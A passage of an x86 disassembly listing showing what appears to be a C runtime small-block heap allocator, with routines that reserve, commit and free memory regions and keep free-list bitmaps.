  42694c:	mov    ecx,DWORD PTR [ebp+0x8]
  42694f:	or     DWORD PTR [ecx+0x4],ebx
  426952:	lea    ecx,[edx-0x20]
  426955:	mov    edx,0x80000000
  42695a:	shr    edx,cl
  42695c:	lea    eax,[eax+edi*4+0xc4]
  426963:	or     DWORD PTR [eax],edx
  426965:	mov    eax,DWORD PTR [ebp-0x4]
  426968:	mov    DWORD PTR [esi],eax
  42696a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  42696e:	mov    eax,DWORD PTR [ebp-0x10]
  426971:	dec    DWORD PTR [eax]
  426973:	jne    0x426a70
  426979:	mov    eax,ds:0x45def8
  42697e:	test   eax,eax
  426980:	je     0x426a62
  426986:	mov    ecx,DWORD PTR ds:0x45df10
  42698c:	mov    esi,DWORD PTR ds:0x4290b0
  426992:	push   0x4000
  426997:	shl    ecx,0xf
  42699a:	add    ecx,DWORD PTR [eax+0xc]
  42699d:	mov    ebx,0x8000
  4269a2:	push   ebx
  4269a3:	push   ecx
  4269a4:	call   esi
  4269a6:	mov    ecx,DWORD PTR ds:0x45df10
  4269ac:	mov    eax,ds:0x45def8
  4269b1:	mov    edx,0x80000000
  4269b6:	shr    edx,cl
  4269b8:	or     DWORD PTR [eax+0x8],edx
  4269bb:	mov    eax,ds:0x45def8
  4269c0:	mov    eax,DWORD PTR [eax+0x10]
  4269c3:	mov    ecx,DWORD PTR ds:0x45df10
  4269c9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  4269d1:	mov    eax,ds:0x45def8
  4269d6:	mov    eax,DWORD PTR [eax+0x10]
  4269d9:	dec    BYTE PTR [eax+0x43]
  4269dc:	mov    eax,ds:0x45def8
  4269e1:	mov    ecx,DWORD PTR [eax+0x10]
  4269e4:	cmp    BYTE PTR [ecx+0x43],0x0
  4269e8:	jne    0x4269f3
  4269ea:	and    DWORD PTR [eax+0x4],0xfffffffe
  4269ee:	mov    eax,ds:0x45def8
  4269f3:	cmp    DWORD PTR [eax+0x8],0xffffffff
  4269f7:	jne    0x426a62
  4269f9:	push   ebx
  4269fa:	push   0x0
  4269fc:	push   DWORD PTR [eax+0xc]
  4269ff:	call   esi
  426a01:	mov    eax,ds:0x45def8
  426a06:	push   DWORD PTR [eax+0x10]
  426a09:	push   0x0
  426a0b:	push   DWORD PTR ds:0x45e140
  426a11:	call   DWORD PTR ds:0x429048
  426a17:	mov    eax,ds:0x45defc
  426a1c:	mov    edx,DWORD PTR ds:0x45df00
  426a22:	lea    eax,[eax+eax*4]
  426a25:	shl    eax,0x2
  426a28:	mov    ecx,eax
  426a2a:	mov    eax,ds:0x45def8
  426a2f:	sub    ecx,eax
  426a31:	lea    ecx,[ecx+edx*1-0x14]
  426a35:	push   ecx
  426a36:	lea    ecx,[eax+0x14]
  426a39:	push   ecx
  426a3a:	push   eax
  426a3b:	call   0x428290
  426a40:	mov    eax,DWORD PTR [ebp+0x8]
  426a43:	add    esp,0xc
  426a46:	dec    DWORD PTR ds:0x45defc
  426a4c:	cmp    eax,DWORD PTR ds:0x45def8
  426a52:	jbe    0x426a58
  426a54:	sub    DWORD PTR [ebp+0x8],0x14
  426a58:	mov    eax,ds:0x45df00
  426a5d:	mov    ds:0x45df08,eax
  426a62:	mov    eax,DWORD PTR [ebp+0x8]
  426a65:	mov    ds:0x45def8,eax
  426a6a:	mov    DWORD PTR ds:0x45df10,edi
  426a70:	pop    ebx
  426a71:	pop    edi
  426a72:	pop    esi
  426a73:	leave  
  426a74:	ret    
  426a75:	mov    eax,ds:0x45defc
  426a7a:	mov    ecx,DWORD PTR ds:0x45df0c
  426a80:	push   edi
  426a81:	xor    edi,edi
  426a83:	cmp    eax,ecx
  426a85:	jne    0x426abb
  426a87:	lea    eax,[ecx+ecx*4+0x50]
  426a8b:	shl    eax,0x2
  426a8e:	push   eax
  426a8f:	push   DWORD PTR ds:0x45df00
  426a95:	push   edi
  426a96:	push   DWORD PTR ds:0x45e140
  426a9c:	call   DWORD PTR ds:0x4290d4
  426aa2:	cmp    eax,edi
  426aa4:	jne    0x426aaa
  426aa6:	xor    eax,eax
  426aa8:	pop    edi
  426aa9:	ret    
  426aaa:	add    DWORD PTR ds:0x45df0c,0x10
  426ab1:	mov    ds:0x45df00,eax
  426ab6:	mov    eax,ds:0x45defc
  426abb:	mov    ecx,DWORD PTR ds:0x45df00
  426ac1:	push   esi
  426ac2:	push   0x41c4
  426ac7:	push   0x8
  426ac9:	push   DWORD PTR ds:0x45e140
  426acf:	lea    eax,[eax+eax*4]
  426ad2:	lea    esi,[ecx+eax*4]
  426ad5:	call   DWORD PTR ds:0x429030
  426adb:	cmp    eax,edi
  426add:	mov    DWORD PTR [esi+0x10],eax
  426ae0:	jne    0x426ae6
  426ae2:	xor    eax,eax
  426ae4:	jmp    0x426b29
  426ae6:	push   0x4
  426ae8:	push   0x2000
  426aed:	push   0x100000
  426af2:	push   edi
  426af3:	call   DWORD PTR ds:0x4290d0
  426af9:	cmp    eax,edi
  426afb:	mov    DWORD PTR [esi+0xc],eax
  426afe:	jne    0x426b12
  426b00:	push   DWORD PTR [esi+0x10]
  426b03:	push   edi
  426b04:	push   DWORD PTR ds:0x45e140
  426b0a:	call   DWORD PTR ds:0x429048
  426b10:	jmp    0x426ae2
  426b12:	or     DWORD PTR [esi+0x8],0xffffffff
  426b16:	mov    DWORD PTR [esi],edi
  426b18:	mov    DWORD PTR [esi+0x4],edi
  426b1b:	inc    DWORD PTR ds:0x45defc
  426b21:	mov    eax,DWORD PTR [esi+0x10]
  426b24:	or     DWORD PTR [eax],0xffffffff
  426b27:	mov    eax,esi
  426b29:	pop    esi
  426b2a:	pop    edi
  426b2b:	ret    
  426b2c:	push   ebp
  426b2d:	mov    ebp,esp
  426b2f:	push   ecx
  426b30:	push   ecx
  426b31:	mov    ecx,DWORD PTR [ebp+0x8]
  426b34:	mov    eax,DWORD PTR [ecx+0x8]
  426b37:	push   ebx
  426b38:	push   esi
  426b39:	mov    esi,DWORD PTR [ecx+0x10]
  426b3c:	push   edi
  426b3d:	xor    ebx,ebx
  426b3f:	jmp    0x426b44
  426b41:	shl    eax,1
  426b43:	inc    ebx
  426b44:	test   eax,eax
  426b46:	jge    0x426b41
  426b48:	mov    eax,ebx
  426b4a:	imul   eax,eax,0x204
  426b50:	lea    eax,[eax+esi*1+0x144]
  426b57:	push   0x3f
  426b59:	mov    DWORD PTR [ebp-0x8],eax
  426b5c:	pop    edx
  426b5d:	mov    DWORD PTR [eax+0x8],eax
  426b60:	mov    DWORD PTR [eax+0x4],eax
  426b63:	add    eax,0x8
  426b66:	dec    edx
  426b67:	jne    0x426b5d
  426b69:	push   0x4
  426b6b:	mov    edi,ebx
  426b6d:	push   0x1000
  426b72:	shl    edi,0xf
  426b75:	add    edi,DWORD PTR [ecx+0xc]
  426b78:	push   0x8000
  426b7d:	push   edi
  426b7e:	call   DWORD PTR ds:0x4290d0
  426b84:	test   eax,eax
  426b86:	jne    0x426b90
  426b88:	or     eax,0xffffffff
  426b8b:	jmp    0x426c2d
  426b90:	lea    edx,[edi+0x7000]
  426b96:	cmp    edi,edx
  426b98:	mov    DWORD PTR [ebp-0x4],edx
  426b9b:	ja     0x426be0
  426b9d:	mov    ecx,edx
  426b9f:	sub    ecx,edi
  426ba1:	shr    ecx,0xc
  426ba4:	lea    eax,[edi+0x10]
  426ba7:	inc    ecx
  426ba8:	or     DWORD PTR [eax-0x8],0xffffffff
  426bac:	or     DWORD PTR [eax+0xfec],0xffffffff
  426bb3:	lea    edx,[eax+0xffc]
  426bb9:	mov    DWORD PTR [eax],edx
  426bbb:	lea    edx,[eax-0x1004]
  426bc1:	mov    DWORD PTR [eax-0x4],0xff0
  426bc8:	mov    DWORD PTR [eax+0x4],edx
  426bcb:	mov    DWORD PTR [eax+0xfe8],0xff0
  426bd5:	add    eax,0x1000
  426bda:	dec    ecx
  426bdb:	jne    0x426ba8
  426bdd:	mov    edx,DWORD PTR [ebp-0x4]
  426be0:	mov    eax,DWORD PTR [ebp-0x8]
  426be3:	add    eax,0x1f8
  426be8:	lea    ecx,[edi+0xc]
  426beb:	mov    DWORD PTR [eax+0x4],ecx
  426bee:	mov    DWORD PTR [ecx+0x8],eax
  426bf1:	lea    ecx,[edx+0xc]
  426bf4:	mov    DWORD PTR [eax+0x8],ecx
  426bf7:	mov    DWORD PTR [ecx+0x4],eax
  426bfa:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  426bff:	xor    edi,edi
  426c01:	inc    edi
  426c02:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  426c09:	mov    al,BYTE PTR [esi+0x43]
  426c0c:	mov    cl,al
  426c0e:	inc    cl
  426c10:	test   al,al
  426c12:	mov    eax,DWORD PTR [ebp+0x8]
  426c15:	mov    BYTE PTR [esi+0x43],cl
  426c18:	jne    0x426c1d
  426c1a:	or     DWORD PTR [eax+0x4],edi
  426c1d:	mov    edx,0x80000000
  426c22:	mov    ecx,ebx
  426c24:	shr    edx,cl
  426c26:	not    edx
  426c28:	and    DWORD PTR [eax+0x8],edx
  426c2b:	mov    eax,ebx
  426c2d:	pop    edi
  426c2e:	pop    esi
  426c2f:	pop    ebx
  426c30:	leave  
  426c31:	ret    
  426c32:	push   ebp
  426c33:	mov    ebp,esp
  426c35:	sub    esp,0xc
  426c38:	mov    ecx,DWORD PTR [ebp+0x8]
  426c3b:	mov    eax,DWORD PTR [ecx+0x10]
  426c3e:	push   ebx
  426c3f:	push   esi
  426c40:	mov    esi,DWORD PTR [ebp+0x10]
  426c43:	push   edi
  426c44:	mov    edi,DWORD PTR [ebp+0xc]
  426c47:	mov    edx,edi
  426c49:	sub    edx,DWORD PTR [ecx+0xc]
  426c4c:	add    esi,0x17
  426c4f:	shr    edx,0xf
  426c52:	mov    ecx,edx
  426c54:	imul   ecx,ecx,0x204
  426c5a:	lea    ecx,[ecx+eax*1+0x144]
  426c61:	mov    DWORD PTR [ebp-0xc],ecx
  426c64:	mov    ecx,DWORD PTR [edi-0x4]
  426c67:	and    esi,0xfffffff0
  426c6a:	dec    ecx
  426c6b:	cmp    esi,ecx
  426c6d:	lea    edi,[ecx+edi*1-0x4]
  426c71:	mov    ebx,DWORD PTR [edi]
  426c73:	mov    DWORD PTR [ebp+0x10],ecx
  426c76:	mov    DWORD PTR [ebp-0x4],ebx
  426c79:	jle    0x426dd4
  426c7f:	test   bl,0x1
  426c82:	jne    0x426dcd
  426c88:	add    ebx,ecx
  426c8a:	cmp    esi,ebx
  426c8c:	jg     0x426dcd
  426c92:	mov    ecx,DWORD PTR [ebp-0x4]
  426c95:	sar    ecx,0x4
  426c98:	dec    ecx
  426c99:	cmp    ecx,0x3f
  426c9c:	mov    DWORD PTR [ebp-0x8],ecx
  426c9f:	jbe    0x426ca7
  426ca1:	push   0x3f
  426ca3:	pop    ecx
  426ca4:	mov    DWORD PTR [ebp-0x8],ecx
  426ca7:	mov    ebx,DWORD PTR [edi+0x4]
  426caa:	cmp    ebx,DWORD PTR [edi+0x8]
  426cad:	jne    0x426cf2
  426caf:	cmp    ecx,0x20
  426cb2:	mov    ebx,0x80000000
  426cb7:	jae    0x426cd3
  426cb9:	shr    ebx,cl
  426cbb:	mov    ecx,DWORD PTR [ebp-0x8]
  426cbe:	lea    ecx,[ecx+eax*1+0x4]
  426cc2:	not    ebx
  426cc4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426cc8:	dec    BYTE PTR [ecx]
  426cca:	jne    0x426cf2
  426ccc:	mov    ecx,DWORD PTR [ebp+0x8]
  426ccf:	and    DWORD PTR [ecx],ebx
  426cd1:	jmp    0x426cf2
  426cd3:	add    ecx,0xffffffe0
  426cd6:	shr    ebx,cl
  426cd8:	mov    ecx,DWORD PTR [ebp-0x8]
  426cdb:	lea    ecx,[ecx+eax*1+0x4]
  426cdf:	not    ebx
  426ce1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426ce8:	dec    BYTE PTR [ecx]
  426cea:	jne    0x426cf2
  426cec:	mov    ecx,DWORD PTR [ebp+0x8]
  426cef:	and    DWORD PTR [ecx+0x4],ebx
  426cf2:	mov    ecx,DWORD PTR [edi+0x8]
  426cf5:	mov    ebx,DWORD PTR [edi+0x4]
  426cf8:	mov    DWORD PTR [ecx+0x4],ebx
  426cfb:	mov    ecx,DWORD PTR [edi+0x4]
  426cfe:	mov    edi,DWORD PTR [edi+0x8]
  426d01:	mov    DWORD PTR [ecx+0x8],edi
  426d04:	mov    ecx,DWORD PTR [ebp+0x10]
  426d07:	sub    ecx,esi
  426d09:	add    DWORD PTR [ebp-0x4],ecx
  426d0c:	cmp    DWORD PTR [ebp-0x4],0x0
  426d10:	jle    0x426dbb
  426d16:	mov    edi,DWORD PTR [ebp-0x4]
  426d19:	mov    ecx,DWORD PTR [ebp+0xc]
  426d1c:	sar    edi,0x4
  426d1f:	dec    edi
  426d20:	cmp    edi,0x3f
  426d23:	lea    ecx,[ecx+esi*1-0x4]
  426d27:	jbe    0x426d2c
  426d29:	push   0x3f
  426d2b:	pop    edi
  426d2c:	mov    ebx,DWORD PTR [ebp-0xc]
  426d2f:	lea    ebx,[ebx+edi*8]
  426d32:	mov    DWORD PTR [ebp+0x10],ebx
  426d35:	mov    ebx,DWORD PTR [ebx+0x4]
  426d38:	mov    DWORD PTR [ecx+0x4],ebx
  426d3b:	mov    ebx,DWORD PTR [ebp+0x10]
  426d3e:	mov    DWORD PTR [ecx+0x8],ebx
  426d41:	mov    DWORD PTR [ebx+0x4],ecx
  426d44:	mov    ebx,DWORD PTR [ecx+0x4]
  426d47:	mov    DWORD PTR [ebx+0x8],ecx
  426d4a:	mov    ebx,DWORD PTR [ecx+0x4]
  426d4d:	cmp    ebx,DWORD PTR [ecx+0x8]
  426d50:	jne    0x426da9
  426d52:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  426d56:	mov    BYTE PTR [ebp+0x13],cl
  426d59:	inc    cl
  426d5b:	cmp    edi,0x20
  426d5e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  426d62:	jae    0x426d80
  426d64:	cmp    BYTE PTR [ebp+0x13],0x0
  426d68:	jne    0x426d78
  426d6a:	mov    ecx,edi
  426d6c:	mov    ebx,0x80000000
  426d71:	shr    ebx,cl
  426d73:	mov    ecx,DWORD PTR [ebp+0x8]
  426d76:	or     DWORD PTR [ecx],ebx
  426d78:	lea    eax,[eax+edx*4+0x44]
  426d7c:	mov    ecx,edi
  426d7e:	jmp    0x426da0
  426d80:	cmp    BYTE PTR [ebp+0x13],0x0
  426d84:	jne    0x426d96
  426d86:	lea    ecx,[edi-0x20]
  426d89:	mov    ebx,0x80000000
  426d8e:	shr    ebx,cl
  426d90:	mov    ecx,DWORD PTR [ebp+0x8]
  426d93:	or     DWORD PTR [ecx+0x4],ebx
  426d96:	lea    eax,[eax+edx*4+0xc4]
  426d9d:	lea    ecx,[edi-0x20]
  426da0:	mov    edx,0x80000000
  426da5:	shr    edx,cl
  426da7:	or     DWORD PTR [eax],edx
  426da9:	mov    edx,DWORD PTR [ebp+0xc]
  426dac:	mov    ecx,DWORD PTR [ebp-0x4]
  426daf:	lea    eax,[edx+esi*1-0x4]
  426db3:	mov    DWORD PTR [eax],ecx
  426db5:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  426db9:	jmp    0x426dbe
  426dbb:	mov    edx,DWORD PTR [ebp+0xc]
  426dbe:	lea    eax,[esi+0x1]
  426dc1:	mov    DWORD PTR [edx-0x4],eax
  426dc4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  426dc8:	jmp    0x426f09
  426dcd:	xor    eax,eax
  426dcf:	jmp    0x426f0c
  426dd4:	jge    0x426f09
  426dda:	mov    ebx,DWORD PTR [ebp+0xc]
  426ddd:	sub    DWORD PTR [ebp+0x10],esi
  426de0:	lea    ecx,[esi+0x1]
  426de3:	mov    DWORD PTR [ebx-0x4],ecx
  426de6:	lea    ebx,[ebx+esi*1-0x4]
  426dea:	mov    esi,DWORD PTR [ebp+0x10]
  426ded:	sar    esi,0x4
  426df0:	dec    esi
  426df1:	cmp    esi,0x3f
  426df4:	mov    DWORD PTR [ebp+0xc],ebx
  426df7:	mov    DWORD PTR [ebx-0x4],ecx
  426dfa:	jbe    0x426dff
  426dfc:	push   0x3f
  426dfe:	pop    esi
  426dff:	test   BYTE PTR [ebp-0x4],0x1
  426e03:	jne    0x426e89
  426e09:	mov    esi,DWORD PTR [ebp-0x4]
  426e0c:	sar    esi,0x4
  426e0f:	dec    esi
  426e10:	cmp    esi,0x3f
  426e13:	jbe    0x426e18
  426e15:	push   0x3f
  426e17:	pop    esi
  426e18:	mov    ecx,DWORD PTR [edi+0x4]
  426e1b:	cmp    ecx,DWORD PTR [edi+0x8]
  426e1e:	jne    0x426e62
  426e20:	cmp    esi,0x20
  426e23:	mov    ebx,0x80000000
  426e28:	jae    0x426e43
  426e2a:	mov    ecx,esi
  426e2c:	shr    ebx,cl
  426e2e:	lea    esi,[esi+eax*1+0x4]
  426e32:	not    ebx
  426e34:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426e38:	dec    BYTE PTR [esi]
  426e3a:	jne    0x426e5f
  426e3c:	mov    ecx,DWORD PTR [ebp+0x8]
  426e3f:	and    DWORD PTR [ecx],ebx
  426e41:	jmp    0x426e5f
  426e43:	lea    ecx,[esi-0x20]
  426e46:	shr    ebx,cl
  426e48:	lea    ecx,[esi+eax*1+0x4]
  426e4c:	not    ebx
  426e4e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426e55:	dec    BYTE PTR [ecx]
  426e57:	jne    0x426e5f
  426e59:	mov    ecx,DWORD PTR [ebp+0x8]
  426e5c:	and    DWORD PTR [ecx+0x4],ebx
  426e5f:	mov    ebx,DWORD PTR [ebp+0xc]
  426e62:	mov    ecx,DWORD PTR [edi+0x8]
  426e65:	mov    esi,DWORD PTR [edi+0x4]
  426e68:	mov    DWORD PTR [ecx+0x4],esi
  426e6b:	mov    esi,DWORD PTR [edi+0x8]
  426e6e:	mov    ecx,DWORD PTR [edi+0x4]
  426e71:	mov    DWORD PTR [ecx+0x8],esi
  426e74:	mov    esi,DWORD PTR [ebp+0x10]
  426e77:	add    esi,DWORD PTR [ebp-0x4]
  426e7a:	mov    DWORD PTR [ebp+0x10],esi
  426e7d:	sar    esi,0x4
  426e80:	dec    esi
  426e81:	cmp    esi,0x3f
  426e84:	jbe    0x426e89
  426e86:	push   0x3f
  426e88:	pop    esi
  426e89:	mov    ecx,DWORD PTR [ebp-0xc]
  426e8c:	lea    ecx,[ecx+esi*8]
  426e8f:	mov    edi,DWORD PTR [ecx+0x4]
  426e92:	mov    DWORD PTR [ebx+0x8],ecx
  426e95:	mov    DWORD PTR [ebx+0x4],edi
  426e98:	mov    DWORD PTR [ecx+0x4],ebx
  426e9b:	mov    ecx,DWORD PTR [ebx+0x4]
  426e9e:	mov    DWORD PTR [ecx+0x8],ebx
  426ea1:	mov    ecx,DWORD PTR [ebx+0x4]
  426ea4:	cmp    ecx,DWORD PTR [ebx+0x8]
  426ea7:	jne    0x426f00
  426ea9:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  426ead:	mov    BYTE PTR [ebp+0xf],cl
  426eb0:	inc    cl
  426eb2:	cmp    esi,0x20
  426eb5:	mov    BYTE PTR [esi+eax*1+0x4],cl
  426eb9:	jae    0x426ed7
  426ebb:	cmp    BYTE PTR [ebp+0xf],0x0
  426ebf:	jne    0x426ecf
  426ec1:	mov    ecx,esi
  426ec3:	mov    edi,0x80000000
  426ec8:	shr    edi,cl
  426eca:	mov    ecx,DWORD PTR [ebp+0x8]
  426ecd:	or     DWORD PTR [ecx],edi
  426ecf:	lea    eax,[eax+edx*4+0x44]
  426ed3:	mov    ecx,esi
  426ed5:	jmp    0x426ef7
  426ed7:	cmp    BYTE PTR [ebp+0xf],0x0
  426edb:	jne    0x426eed
  426edd:	lea    ecx,[esi-0x20]
  426ee0:	mov    edi,0x80000000
  426ee5:	shr    edi,cl
  426ee7:	mov    ecx,DWORD PTR [ebp+0x8]
  426eea:	or     DWORD PTR [ecx+0x4],edi
  426eed:	lea    eax,[eax+edx*4+0xc4]
  426ef4:	lea    ecx,[esi-0x20]
  426ef7:	mov    edx,0x80000000
  426efc:	shr    edx,cl
  426efe:	or     DWORD PTR [eax],edx
  426f00:	mov    eax,DWORD PTR [ebp+0x10]
  426f03:	mov    DWORD PTR [ebx],eax
  426f05:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  426f09:	xor    eax,eax
  426f0b:	inc    eax
  426f0c:	pop    edi
  426f0d:	pop    esi
  426f0e:	pop    ebx
  426f0f:	leave  
  426f10:	ret    
  426f11:	push   ebp
  426f12:	mov    ebp,esp
  426f14:	sub    esp,0x14
  426f17:	mov    ecx,DWORD PTR [ebp+0x8]
  426f1a:	mov    eax,ds:0x45defc
  426f1f:	mov    edx,DWORD PTR ds:0x45df00
  426f25:	add    ecx,0x17
  426f28:	and    ecx,0xfffffff0
  426f2b:	push   ebx
  426f2c:	mov    DWORD PTR [ebp-0x10],ecx
  426f2f:	sar    ecx,0x4
  426f32:	push   esi
  426f33:	lea    eax,[eax+eax*4]
  426f36:	push   edi
  426f37:	dec    ecx
  426f38:	cmp    ecx,0x20
  426f3b:	lea    edi,[edx+eax*4]
  426f3e:	mov    DWORD PTR [ebp-0x4],edi
  426f41:	jge    0x426f4e
  426f43:	or     esi,0xffffffff
  426f46:	shr    esi,cl
  426f48:	or     DWORD PTR [ebp-0x8],0xffffffff
  426f4c:	jmp    0x426f5b
  426f4e:	add    ecx,0xffffffe0
  426f51:	or     eax,0xffffffff
  426f54:	xor    esi,esi
  426f56:	shr    eax,cl
  426f58:	mov    DWORD PTR [ebp-0x8],eax
  426f5b:	mov    eax,ds:0x45df08
  426f60:	mov    ebx,eax
  426f62:	mov    DWORD PTR [ebp-0xc],esi
  426f65:	cmp    ebx,edi
  426f67:	jmp    0x426f7d
  426f69:	mov    ecx,DWORD PTR [ebx+0x4]
  426f6c:	mov    edi,DWORD PTR [ebx]
  426f6e:	and    ecx,DWORD PTR [ebp-0x8]
  426f71:	and    edi,esi
  426f73:	or     ecx,edi
  426f75:	jne    0x426f82
  426f77:	add    ebx,0x14
  426f7a:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f7d:	mov    DWORD PTR [ebp+0x8],ebx
  426f80:	jb     0x426f69
  426f82:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f85:	jne    0x426fab
  426f87:	mov    ebx,edx
  426f89:	jmp    0x426f9c
  426f8b:	mov    ecx,DWORD PTR [ebx+0x4]
  426f8e:	mov    edi,DWORD PTR [ebx]
  426f90:	and    ecx,DWORD PTR [ebp-0x8]
  426f93:	and    edi,esi
  426f95:	or     ecx,edi
  426f97:	jne    0x426fa3
  426f99:	add    ebx,0x14
  426f9c:	cmp    ebx,eax
  426f9e:	mov    DWORD PTR [ebp+0x8],ebx
  426fa1:	jb     0x426f8b
  426fa3:	cmp    ebx,eax
  426fa5:	je     0x42703f
  426fab:	mov    DWORD PTR ds:0x45df08,ebx
  426fb1:	mov    eax,DWORD PTR [ebx+0x10]
  426fb4:	mov    edx,DWORD PTR [eax]
  426fb6:	cmp    edx,0xffffffff
  426fb9:	mov    DWORD PTR [ebp-0x4],edx
  426fbc:	je     0x426fd2
  426fbe:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  426fc5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  426fc9:	and    ecx,DWORD PTR [ebp-0x8]
  426fcc:	and    edi,esi
  426fce:	or     ecx,edi
  426fd0:	jne    0x427008
  426fd2:	mov    edx,DWORD PTR [eax+0xc4]
  426fd8:	and    edx,DWORD PTR [ebp-0x8]
  426fdb:	and    DWORD PTR [ebp-0x4],0x0
  426fdf:	lea    ecx,[eax+0x44]
  426fe2:	mov    esi,DWORD PTR [ecx]
  426fe4:	and    esi,DWORD PTR [ebp-0xc]
  426fe7:	or     edx,esi
  426fe9:	mov    esi,DWORD PTR [ebp-0xc]
  426fec:	jne    0x427005
  426fee:	mov    edx,DWORD PTR [ecx+0x84]
  426ff4:	and    edx,DWORD PTR [ebp-0x8]
  426ff7:	inc    DWORD PTR [ebp-0x4]
  426ffa:	add    ecx,0x4
  426ffd:	mov    edi,DWORD PTR [ecx]
  426fff:	and    edi,esi
  427001:	or     edx,edi
  427003:	je     0x426fee
  427005:	mov    edx,DWORD PTR [ebp-0x4]
  427008:	mov    ecx,edx
  42700a:	imul   ecx,ecx,0x204
  427010:	lea    ecx,[ecx+eax*1+0x144]
  427017:	mov    DWORD PTR [ebp-0xc],ecx
  42701a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42701e:	xor    edi,edi
  427020:	and    ecx,esi
  427022:	jne    0x427091
  427024:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42702b:	and    ecx,DWORD PTR [ebp-0x8]
  42702e:	push   0x20
  427030:	pop    edi
  427031:	jmp    0x427091
  427033:	cmp    DWORD PTR [ebx+0x8],0x0
  427037:	jne    0x427044
  427039:	add    ebx,0x14
  42703c:	mov    DWORD PTR [ebp+0x8],ebx
  42703f:	cmp    ebx,DWORD PTR [ebp-0x4]
  427042:	jb     0x427033
  427044:	cmp    ebx,DWORD PTR [ebp-0x4]
  427047:	jne    0x42706f
  427049:	mov    ebx,edx
  42704b:	jmp    0x427056
  42704d:	cmp    DWORD PTR [ebx+0x8],0x0
  427051:	jne    0x42705d
  427053:	add    ebx,0x14
  427056:	cmp    ebx,eax
  427058:	mov    DWORD PTR [ebp+0x8],ebx
  42705b:	jb     0x42704d
  42705d:	cmp    ebx,eax
  42705f:	jne    0x42706f
  427061:	call   0x426a75
  427066:	mov    ebx,eax
  427068:	test   ebx,ebx
  42706a:	mov    DWORD PTR [ebp+0x8],ebx
  42706d:	je     0x427087
  42706f:	push   ebx
  427070:	call   0x426b2c
  427075:	pop    ecx
  427076:	mov    ecx,DWORD PTR [ebx+0x10]
  427079:	mov    DWORD PTR [ecx],eax
  42707b:	mov    eax,DWORD PTR [ebx+0x10]
  42707e:	cmp    DWORD PTR [eax],0xffffffff
  427081:	jne    0x426fab
  427087:	xor    eax,eax
  427089:	jmp    0x427208
  42708e:	shl    ecx,1
  427090:	inc    edi
  427091:	test   ecx,ecx
  427093:	jge    0x42708e
  427095:	mov    ecx,DWORD PTR [ebp-0xc]
  427098:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  42709c:	mov    ecx,DWORD PTR [edx]
  42709e:	sub    ecx,DWORD PTR [ebp-0x10]
  4270a1:	mov    esi,ecx
  4270a3:	sar    esi,0x4
  4270a6:	dec    esi
  4270a7:	cmp    esi,0x3f
  4270aa:	mov    DWORD PTR [ebp-0x8],ecx
  4270ad:	jle    0x4270b2
  4270af:	push   0x3f
  4270b1:	pop    esi
  4270b2:	cmp    esi,edi
  4270b4:	je     0x4271bb
  4270ba:	mov    ecx,DWORD PTR [edx+0x4]
  4270bd:	cmp    ecx,DWORD PTR [edx+0x8]
  4270c0:	jne    0x42711e
  4270c2:	cmp    edi,0x20
  4270c5:	mov    ebx,0x80000000
  4270ca:	jge    0x4270f2
  4270cc:	mov    ecx,edi
  4270ce:	shr    ebx,cl
  4270d0:	mov    ecx,DWORD PTR [ebp-0x4]
  4270d3:	lea    edi,[eax+edi*1+0x4]
  4270d7:	not    ebx
  4270d9:	mov    DWORD PTR [ebp-0x14],ebx
  4270dc:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4270e0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4270e4:	dec    BYTE PTR [edi]
  4270e6:	jne    0x42711b
  4270e8:	mov    ecx,DWORD PTR [ebp-0x14]
  4270eb:	mov    ebx,DWORD PTR [ebp+0x8]
  4270ee:	and    DWORD PTR [ebx],ecx
  4270f0:	jmp    0x42711e
  4270f2:	lea    ecx,[edi-0x20]
  4270f5:	shr    ebx,cl
  4270f7:	mov    ecx,DWORD PTR [ebp-0x4]
  4270fa:	lea    ecx,[eax+ecx*4+0xc4]
  427101:	lea    edi,[eax+edi*1+0x4]
  427105:	not    ebx
  427107:	and    DWORD PTR [ecx],ebx
  427109:	dec    BYTE PTR [edi]
  42710b:	mov    DWORD PTR [ebp-0x14],ebx
  42710e:	jne    0x42711b
  427110:	mov    ebx,DWORD PTR [ebp+0x8]
  427113:	mov    ecx,DWORD PTR [ebp-0x14]
  427116:	and    DWORD PTR [ebx+0x4],ecx
  427119:	jmp    0x42711e
  42711b:	mov    ebx,DWORD PTR [ebp+0x8]
  42711e:	cmp    DWORD PTR [ebp-0x8],0x0
  427122:	mov    ecx,DWORD PTR [edx+0x8]
  427125:	mov    edi,DWORD PTR [edx+0x4]
  427128:	mov    DWORD PTR [ecx+0x4],edi
  42712b:	mov    ecx,DWORD PTR [edx+0x4]
  42712e:	mov    edi,DWORD PTR [edx+0x8]
  427131:	mov    DWORD PTR [ecx+0x8],edi
  427134:	je     0x4271c7
  42713a:	mov    ecx,DWORD PTR [ebp-0xc]
  42713d:	lea    ecx,[ecx+esi*8]
  427140:	mov    edi,DWORD PTR [ecx+0x4]
  427143:	mov    DWORD PTR [edx+0x8],ecx
  427146:	mov    DWORD PTR [edx+0x4],edi
  427149:	mov    DWORD PTR [ecx+0x4],edx
  42714c:	mov    ecx,DWORD PTR [edx+0x4]
  42714f:	mov    DWORD PTR [ecx+0x8],edx
  427152:	mov    ecx,DWORD PTR [edx+0x4]
  427155:	cmp    ecx,DWORD PTR [edx+0x8]
  427158:	jne    0x4271b8
  42715a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42715e:	mov    BYTE PTR [ebp+0xb],cl
  427161:	inc    cl
  427163:	cmp    esi,0x20
